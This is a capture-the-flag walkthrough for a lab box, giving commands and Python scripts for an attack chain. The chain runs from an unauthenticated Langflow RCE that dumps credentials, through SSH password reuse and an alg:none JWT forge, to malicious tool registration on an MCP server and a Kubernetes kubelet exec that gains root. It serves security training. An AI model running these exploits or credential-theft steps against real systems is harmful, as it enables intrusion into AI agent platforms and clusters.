# Fireflow — Step-by-Step Walkthrough

The commands and the *how*, in order. Run each one and read your own output — the box reveals the rest. For the *why* behind each step, see [README.md](README.md).

`<target>` is the target box's IP.

---

## 0. Recon

Scan all ports, then fingerprint the open ones:

```bash
nmap -p- --min-rate 3000 -oN allports.txt <target>
nmap -sCV -p<open-ports> -oN svc.txt <target>
```

Read the TLS certificate in that output — the `commonName` gives the hostname, and a wildcard `Subject Alternative Name` tells you there are subdomains. Add the hostname:

```bash
echo "<target> fireflow.htb" | sudo tee -a /etc/hosts
```

### Find the subdomain (vhost fuzzing)

Get the baseline for a vhost that doesn't exist (note its status code and size):

```bash
curl -sk -o /dev/null -w "%{http_code} %{size_download}\n" -H "Host: nope.fireflow.htb" https://<target>/
```

Fuzz subdomains, filtering out that baseline size (`-fs <size>`):

```bash
ffuf -u https://<target>/ -H "Host: FUZZ.fireflow.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs <baseline-size>
```

Add the vhost you find to `/etc/hosts` as well.

---

## 1. Find the flow_id

The Langflow foothold needs a public **flow_id** (a UUID). It is leaked in the **main site's HTML** as a `/playground/<uuid>` link (the "Open Agent" button). Pull it out:

```bash
curl -sk https://fireflow.htb/ | grep -oE 'playground/[0-9a-f-]{36}'
```

Check the Langflow version on the flow vhost:

```bash
curl -sk https://flow.<domain>/api/v1/version
```

---

## 2. Foothold — CVE-2026-33017 (unauth RCE)

### Confirm the sink is live (the banner may lie)

The patched Langflow drops the `data` parameter; the vulnerable one still validates it. Send a malformed `data` and read the response:

```bash
curl -sk -X POST "https://flow.<domain>/api/v1/build_public_tmp/<flow_id>/flow" \
  -H 'Content-Type: application/json' -b 'client_id=x' \
  -d '{"data":"not-an-object"}'
```

A **422 naming `body.data`** means the parameter exists and the RCE sink is reachable. (A patched box ignores it and returns a job id.)

### Run the exploit

> **Where this runs:** `fireflow_rce.py` is the **only** script you run from your **attack box** — it targets the public Langflow endpoint. Every other script in this guide runs from the **foothold** (step 3 onward).

Set `FLOW_ID` inside it, then confirm execution and dump the environment:

```bash
# edit scripts/fireflow_rce.py -> FLOW_ID = "<flow_id>"
python3 scripts/fireflow_rce.py "id; hostname"
python3 scripts/fireflow_rce.py "env | sort"
```

Output comes back inline over the build stream (`?event_delivery=direct`) — no reverse shell needed. Note the credentials in the `env` output. The `.env` is also readable directly:

```bash
python3 scripts/fireflow_rce.py "cat /etc/langflow/.env"
```

---

## 3. Lateral movement — SSH

Find the shell-having user, then try the recovered password over SSH (it's reused):

```bash
python3 scripts/fireflow_rce.py "grep bash /etc/passwd"
ssh <user>@fireflow.htb
```

Grab `user.txt` from the home directory.

---

## 4. Enumerate the MCP server

From the user's shell, read the MCP config in their home:

```bash
cat ~/.mcp/config.json
```

It gives the server URL, a username, and a password. Query the version endpoint — it documents its own attack surface (auth type, supported algorithms, endpoints):

```bash
curl -s http://<target>:<mcp-port>/api/v1/version
```

Pull the full schemas and look at the tool-registration request body:

```bash
curl -s http://<target>:<mcp-port>/openapi.json | python3 -m json.tool
```

Authenticate legitimately to see what a real token looks like, then decode its payload:

```bash
set +H   # stop bash expanding '!' in the password
curl -s -X POST http://<target>:<mcp-port>/api/v1/auth \
  -H 'Content-Type: application/json' \
  --data-raw '{"username":"<mcp-user>","password":"<mcp-pass>"}'

echo '<access_token>' | cut -d. -f2 | base64 -d 2>/dev/null
```

Note which claim controls the role. List the existing tools over MCP (JSON-RPC):

```bash
curl -s -X POST http://<target>:<mcp-port>/mcp \
  -H 'Content-Type: application/json' \
  --data-raw '{"jsonrpc":"2.0","id":1,"method":"tools/list"}'
```

---

## 5. Forge an admin JWT (`alg:none`)

> **Where this runs:** from here on, everything runs **from the foothold** (your SSH session as the box user) — the MCP server is only reachable from the box, not from your attack box. Copy the scripts over (paste into a file, or `scp`).

Find which forge the server accepts. `jwt_matrix.py` tests every `none`/signature/role combination against the admin-only endpoint with a harmless no-op tool. Set `BOT` inside it to the username, then run:

```bash
python3 scripts/jwt_matrix.py
```

The row that returns `200` is your working forge. (`mcp_client.py` builds that token automatically — nothing to paste.)

---

## 6. Register a malicious tool → code execution in the pod

`mcp_client.py` forges the admin token, registers a tool (whose `code` runs server-side), and calls it. The server captures **stdout**, so tool code must `print()`.

Set `BOT` inside `mcp_client.py`. Write a probe to confirm execution and check for a Kubernetes service-account token:

```python
# probe.py
import subprocess, os
print(subprocess.getoutput("id"))
print(os.uname().nodename)
print("K8S:", os.path.exists("/var/run/secrets/kubernetes.io/serviceaccount/token"))
```

```bash
python3 scripts/mcp_client.py register probe probe.py
python3 scripts/mcp_client.py call probe
```

If the token exists, you have code execution **inside a Kubernetes pod**. Everything below (steps 7–8) works the same way: you still type the commands from the **foothold**, but the script's code executes **inside the pod** — write a script, register it as a tool with `mcp_client.py`, call it, read the stdout it returns.

---

## 7. Enumerate Kubernetes RBAC

Ask the API server what this pod's service account can do:

```python
# rbac.py
import json, ssl, urllib.request
SA="/var/run/secrets/kubernetes.io/serviceaccount"
tok=open(f"{SA}/token").read().strip(); ca=f"{SA}/ca.crt"
ctx=ssl.create_default_context(cafile=ca)
req=urllib.request.Request("https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectrulesreviews",
    data=json.dumps({"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview",
                     "spec":{"namespace":"default"}}).encode(),
    method="POST", headers={"Authorization":f"Bearer {tok}","Content-Type":"application/json"})
print(urllib.request.urlopen(req,context=ctx,timeout=10).read().decode())
```

```bash
python3 scripts/mcp_client.py register rbac rbac.py
python3 scripts/mcp_client.py call rbac
```

Note the one useful permission in the result. Then find a privileged pod by enumerating the kubelet's `/pods` through the node proxy (a GET, which that permission allows):

```python
# findpod.py
import json, ssl, urllib.request
SA="/var/run/secrets/kubernetes.io/serviceaccount"
tok=open(f"{SA}/token").read().strip(); ca=f"{SA}/ca.crt"
ctx=ssl.create_default_context(cafile=ca)
req=urllib.request.Request("https://kubernetes.default.svc/api/v1/nodes/<node>/proxy/pods",
    headers={"Authorization":f"Bearer {tok}"})
data=json.loads(urllib.request.urlopen(req,context=ctx,timeout=10).read())
for p in data["items"]:
    for c in p["spec"]["containers"]:
        sc=c.get("securityContext",{}) or {}
        vols=[v["hostPath"]["path"] for v in p["spec"].get("volumes",[]) if "hostPath" in v]
        if sc.get("privileged"):
            print(p["metadata"]["namespace"], p["metadata"]["name"], c["name"], "hostPaths:", vols)
```

```bash
python3 scripts/mcp_client.py register findpod findpod.py
python3 scripts/mcp_client.py call findpod
```

Look for a privileged container that mounts the host `/` — that's your exec target.

---

## 8. Root — kubelet exec via `get nodes/proxy`

`get nodes/proxy` is enough: a kubelet exec runs over a WebSocket, and a WebSocket handshake is an HTTP **GET**, so it authorizes as `get` (no `create` check). `kexec_v4.py` runs **inside the pod** (register it as a tool).

Edit `scripts/kexec_v4.py`: set `NODE`, `NS`, `CNT`, and `CMD` to match the target pod. Host `/` is mounted inside the container, so point `CMD` at the flag through that mount, then:

```bash
python3 scripts/mcp_client.py register root kexec_v4.py
python3 scripts/mcp_client.py call root
```

If the exec returns `400`, the kubelet params are `output=1&error=1` (**not** `stdout=true`), the subprotocol is `v4.channel.k8s.io`, and stdout is channel byte `1` — see [scripts/README.md](scripts/README.md).

A root `id` and the flag come back on stdout.

---

## Chain summary

| Step | From where | Command / script |
|------|-----------|------------------|
| Recon | attack box | `nmap`, `ffuf` |
| flow_id | attack box | `curl ... \| grep playground` |
| Foothold | attack box | `fireflow_rce.py` |
| Lateral | attack box | `ssh` (reused password) |
| MCP enum | user shell | `curl .../api/v1/version`, `/openapi.json`, `/api/v1/auth`, `tools/list` |
| JWT forge | user shell | `jwt_matrix.py` |
| Pod exec | user shell | `mcp_client.py register/call` |
| RBAC enum | in-pod tool | `rbac.py`, `findpod.py` |
| Root | in-pod tool | `kexec_v4.py` |
